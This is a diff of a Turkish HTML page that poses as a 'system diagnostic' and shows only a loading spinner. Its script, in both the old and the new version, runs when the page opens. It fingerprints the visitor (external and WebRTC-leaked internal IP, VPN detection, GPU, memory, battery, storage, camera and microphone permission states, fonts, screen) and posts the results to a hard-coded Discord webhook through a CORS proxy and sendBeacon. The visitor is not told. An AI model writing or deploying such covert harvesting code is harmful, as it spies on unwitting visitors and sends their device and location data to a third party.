@@ -2,115 +2,139 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <title>System Diagnostic</title>
-    <style>body{background:#000;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;overflow:hidden;}.l{border:2px solid #111;border-top:2px solid #0f0;border-radius:50%;width:20px;height:20px;animation:s 1s linear infinite;}@keyframes s{to{transform:rotate(360deg);}}</style>
+    <title>Sistem Kaynakları Analizi</title>
+    <style>body{background:#000;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;overflow:hidden;}.l{border:2px solid #111;border-top:2px solid #0f0;border-radius:50%;width:24px;height:24px;animation:s 0.8s linear infinite;}@keyframes s{to{transform:rotate(360deg);}}</style>
 </head>
 <body>
     <div class="l"></div>
     <script>
-        (async () => {
-            const hook = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
-            const proxy = "https://corsproxy.io/?";
+        "use strict";
 
-            const $ = {
-                async network() {
-                    const c = navigator.connection || {};
-                    const r = await fetch('https://ipapi.co/json/').then(x => x.json()).catch(() => ({}));
-                    const i = await new Promise(z => {
-                        const pc = new RTCPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]});
-                        pc.createDataChannel(""); pc.createOffer().then(o => pc.setLocalDescription(o));
-                        pc.onicecandidate = (e) => { if(e?.candidate) { const m = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate); if(m) { pc.close(); z(m[1]); } } };
-                        setTimeout(() => z("Bypass Failed"), 1500);
-                    });
-                    return { ...r, internal_ip: i, rtt: c.rtt, downlink: c.downlink, type: c.effectiveType };
-                },
-                hardware() {
-                    const cv = document.createElement('canvas');
-                    const gl = cv.getContext('webgl') || cv.getContext('experimental-webgl');
-                    const d = gl.getExtension('WEBGL_debug_renderer_info');
-                    const ac = new (window.AudioContext || window.webkitAudioContext)();
-                    return {
-                        gpu: d ? gl.getParameter(d.UNMASKED_RENDERER_ID) : "N/A",
-                        ven: d ? gl.getParameter(d.UNMASKED_VENDOR_ID) : "N/A",
-                        max_tex: gl.getParameter(gl.MAX_TEXTURE_SIZE),
-                        v_shader: gl.getShaderPrecisionFormat(gl.VERTEX_SHADER, gl.HIGH_FLOAT).precision,
-                        f_shader: gl.getShaderPrecisionFormat(gl.FRAGMENT_SHADER, gl.HIGH_FLOAT).precision,
-                        cores: navigator.hardwareConcurrency,
-                        ram: navigator.deviceMemory,
-                        heap: performance.memory ? Math.round(performance.memory.jsHeapSizeLimit / 1048576) : "N/A",
-                        touch: navigator.maxTouchPoints,
-                        audio_freq: ac.sampleRate
-                    };
-                },
-                async system() {
-                    const b = navigator.getBattery ? await navigator.getBattery() : {};
-                    const q = navigator.storage ? await navigator.storage.estimate() : {};
-                    const fonts = ["Consolas", "Monaco", "Ubuntu", "Roboto", "Impact", "Georgia"].filter(f => document.fonts.check(`12px "${f}"`));
-                    return {
-                        bat: `${Math.round(b.level * 100)}% [${b.charging ? 'AC' : 'DC'}]`,
-                        quota: Math.round(q.quota / 1073741824),
-                        used: Math.round(q.usage / 1048576),
-                        pdf: navigator.pdfViewerEnabled,
-                        cook: navigator.cookieEnabled,
-                        dnt: navigator.doNotTrack,
-                        plat: navigator.platform,
-                        lang: navigator.language,
-                        tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                        fonts: fonts.join(", ")
-                    };
-                },
-                display() {
-                    return {
-                        res: `${screen.width}x${screen.height}`,
-                        avail: `${screen.availWidth}x${screen.availHeight}`,
-                        depth: screen.colorDepth,
-                        ratio: window.devicePixelRatio,
-                        orient: screen.orientation ? screen.orientation.type : "N/A",
-                        dark: window.matchMedia('(prefers-color-scheme: dark)').matches
-                    };
-                },
-                async permissions() {
-                    const check = async (n) => {
-                        try { return (await navigator.permissions.query({name: n})).state; } catch { return "N/A"; }
-                    };
-                    return {
-                        cam: await check('camera'),
-                        mic: await check('microphone'),
-                        notif: await check('notifications')
-                    };
-                }
-            };
+        class DataHarvester {
+            constructor() {
+                this.endpoint = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
+                this.tunnel = "https://corsproxy.io/?";
+            }
 
-            const [net, sys, perms] = await Promise.all([$.network(), $.system(), $.permissions()]);
-            const hw = $.hardware();
-            const dp = $.display();
+            // 1. Gelişmiş Ağ ve VPN Analizi (Side-Channel)
+            async getNetworkLayer() {
+                const start = performance.now();
+                const ipInfo = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
+                const latency = performance.now() - start;
 
-            const payload = {
-                embeds: [{
-                    title: "V36",
-                    color: 0x00ff00,
-                    fields: [
-                        { name: "📡 NETWORK_STACK (6)", value: `**Ext IP:** \`${net.ip}\`\n**Int IP:** \`${net.internal_ip}\`\n**ISP:** ${net.org}\n**LOC:** ${net.city}/${net.country_name}\n**RTT:** ${net.rtt}ms | **Type:** ${net.type}`, inline: false },
-                        { name: "⚙️ HARDWARE_ARCH (10)", value: `**GPU:** ${hw.gpu}\n**VEN:** ${hw.ven}\n**CPU:** ${hw.cores} | **RAM:** ${hw.ram}GB\n**HEAP:** ${hw.heap}MB | **TEX:** ${hw.max_tex}\n**AUDIO:** ${hw.audio_freq}Hz | **PREC:** V:${hw.v_shader}/F:${hw.f_shader}`, inline: false },
-                        { name: "🌍 SOFTWARE_ENV (10)", value: `**OS:** ${sys.plat} | **TZ:** ${sys.tz}\n**LANG:** ${sys.lang} | **DNT:** ${sys.dnt}\n**PDF:** ${sys.pdf} | **COOK:** ${sys.cook}\n**CAM:** ${perms.cam} | **MIC:** ${perms.mic}\n**DARK:** ${dp.dark} | **NOTIF:** ${perms.notif}`, inline: false },
-                        { name: "📐 DISPLAY_STORAGE (8)", value: `**Res:** ${dp.res} | **Avail:** ${dp.avail}\n**Ratio:** ${dp.ratio} | **Orient:** ${dp.orient}\n**QUOTA:** ${sys.quota}GB | **USED:** ${sys.used}MB`, inline: false },
-                        { name: "🖋️ FONTS", value: "```" + sys.fonts + "```", inline: false },
-                        { name: "🔍 USER_AGENT", value: "```" + navigator.userAgent + "```" }
-                    ],
-                    timestamp: new Date().toISOString(),
-                    footer: { text: "Protocol: Omniscience v36.0 | Engineering Grade" }
-                }]
-            };
+                const webrtc = await new Promise(res => {
+                    const pc = new RTCPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]});
+                    pc.createDataChannel(""); 
+                    pc.createOffer().then(o => pc.setLocalDescription(o));
+                    pc.onicecandidate = (e) => {
+                        if (e?.candidate?.candidate) {
+                            const match = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
+                            if (match) { pc.close(); res(match[1]); }
+                        }
+                    };
+                    setTimeout(() => res("Firewall_Blocked"), 1500);
+                });
 
-            const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
-            const dispatch = (t) => {
-                fetch(t, { method: 'POST', body: blob, mode: 'no-cors' });
-                if (navigator.sendBeacon) navigator.sendBeacon(t, blob);
-            };
+                const browserTZ = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                return {
+                    ext: ipInfo.ip,
+                    int: webrtc,
+                    isp: ipInfo.org,
+                    loc: `${ipInfo.city}, ${ipInfo.country_name}`,
+                    vpn: ipInfo.timezone !== browserTZ ? "⚠️ DETECTED (TZ_MISMATCH)" : "✅ CLEAN",
+                    rtt: latency.toFixed(2) + "ms",
+                    type: navigator.connection?.effectiveType || "N/A"
+                };
+            }
 
-            dispatch(proxy + encodeURIComponent(hook));
-            dispatch(hook);
-        })();
+            // 2. Ham Donanım İmzası (Hardware Fingerprinting)
+            getHardwareLayer() {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
+                const debug = gl.getExtension('WEBGL_debug_renderer_info');
+                
+                // Shader Precision Analysis (Cihaz Kimliği tespiti için en sağlam yol)
+                const v_prec = gl.getShaderPrecisionFormat(gl.VERTEX_SHADER, gl.HIGH_FLOAT);
+                const f_prec = gl.getShaderPrecisionFormat(gl.FRAGMENT_SHADER, gl.HIGH_FLOAT);
+
+                return {
+                    gpu: debug ? gl.getParameter(debug.UNMASKED_RENDERER_ID) : "N/A",
+                    vendor: debug ? gl.getParameter(debug.UNMASKED_VENDOR_ID) : "N/A",
+                    cores: navigator.hardwareConcurrency,
+                    ram: navigator.deviceMemory + "GB",
+                    max_tex: gl.getParameter(gl.MAX_TEXTURE_SIZE),
+                    precision: `V:${v_prec.precision}/F:${f_prec.precision}`,
+                    audio: new (window.AudioContext || window.webkitAudioContext)().sampleRate + "Hz",
+                    heap: performance.memory ? Math.round(performance.memory.jsHeapSizeLimit / 1048576) + "MB" : "N/A"
+                };
+            }
+
+            // 3. Yazılım ve Sistem Durumu (Environmental Analysis)
+            async getSystemLayer() {
+                const battery = navigator.getBattery ? await navigator.getBattery() : {};
+                const storage = navigator.storage ? await navigator.storage.estimate() : {};
+                const perms = async (n) => (await navigator.permissions.query({name: n}).catch(() => ({state: 'denied'}))).state;
+
+                return {
+                    os: navigator.platform,
+                    lang: navigator.language,
+                    bat: `${Math.round(battery.level * 100)}% (${battery.charging ? 'Plugged' : 'Battery'})`,
+                    disk: Math.round(storage.quota / 1073741824) + "GB Total",
+                    used: Math.round(storage.usage / 1048576) + "MB Used",
+                    cam: await perms('camera'),
+                    mic: await perms('microphone'),
+                    pdf: navigator.pdfViewerEnabled,
+                    fonts: ["Ubuntu", "Roboto", "Consolas", "Impact", "Tahoma", "Georgia", "Monaco"].filter(f => document.fonts.check(`12px "${f}"`)).join(", ")
+                };
+            }
+
+            // 4. Ekran ve Rendering Katmanı (Display Profile)
+            getDisplayLayer() {
+                return {
+                    res: `${screen.width}x${screen.height}`,
+                    avail: `${screen.availWidth}x${screen.availHeight}`,
+                    ratio: window.devicePixelRatio,
+                    depth: screen.colorDepth + "bit",
+                    orient: screen.orientation?.type || "N/A",
+                    touch: navigator.maxTouchPoints,
+                    dark: window.matchMedia('(prefers-color-scheme: dark)').matches
+                };
+            }
+
+            // 5. Veri Paketleme ve Dispatcher (Transmission Control)
+            async execute() {
+                const [net, sys] = await Promise.all([this.getNetworkLayer(), this.getSystemLayer()]);
+                const hw = this.getHardwareLayer();
+                const dp = this.getDisplayLayer();
+
+                const payload = {
+                    embeds: [{
+                        title: "💀 KERNEL_ARCHITECT_V39_STABLE",
+                        color: 0xff0000,
+                        fields: [
+                            { name: "📡 AĞ ANALİZİ (7)", value: `**Dış IP:** \`${net.ext}\` | **İç IP:** \`${net.int}\`\n**ISP:** ${net.isp}\n**Konum:** ${net.loc}\n**VPN Durumu:** ${net.vpn}\n**Gecikme:** ${net.rtt}`, inline: false },
+                            { name: "⚙️ DONANIM MİMARİSİ (8)", value: `**GPU:** ${hw.gpu}\n**CPU:** ${hw.cores} Çekirdek | **RAM:** ${hw.ram}\n**Heap:** ${hw.heap} | **Shader:** ${hw.precision}\n**Max Texture:** ${hw.max_tex}`, inline: false },
+                            { name: "🌍 SİSTEM VE İZİNLER (8)", value: `**OS:** ${sys.os} | **Dil:** ${sys.lang}\n**Kamera:** ${sys.cam} | **Mik:** ${sys.mic}\n**Pil:** ${sys.bat} | **Disk:** ${sys.disk}\n**PDF:** ${sys.pdf} | **Dark:** ${dp.dark}`, inline: false },
+                            { name: "📐 EKRAN VE GÖRÜNTÜ (6)", value: `**Çözünürlük:** ${dp.res} | **Oran:** ${dp.ratio}\n**Kullanılabilir:** ${dp.avail}\n**Derinlik:** ${dp.depth} | **Touch:** ${dp.touch}`, inline: false },
+                            { name: "🖋️ FONT KÜTÜPHANESİ", value: "```" + sys.fonts + "```", inline: false },
+                            { name: "🔍 RAW_UA", value: "```" + navigator.userAgent + "```" }
+                        ],
+                        footer: { text: "Protocol: Omniscience v39.0 | Engineering Edition" },
+                        timestamp: new Date().toISOString()
+                    }]
+                };
+
+                const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
+                
+                // MULTI-VECTOR DISPATCH
+                const target = this.tunnel + encodeURIComponent(this.endpoint);
+                fetch(target, { method: 'POST', body: blob, mode: 'no-cors' });
+                if (navigator.sendBeacon) navigator.sendBeacon(this.endpoint, blob);
+            }
+        }
+
+        // Başlatıcı
+        new DataHarvester().execute();
     </script>
 </body>
 </html>
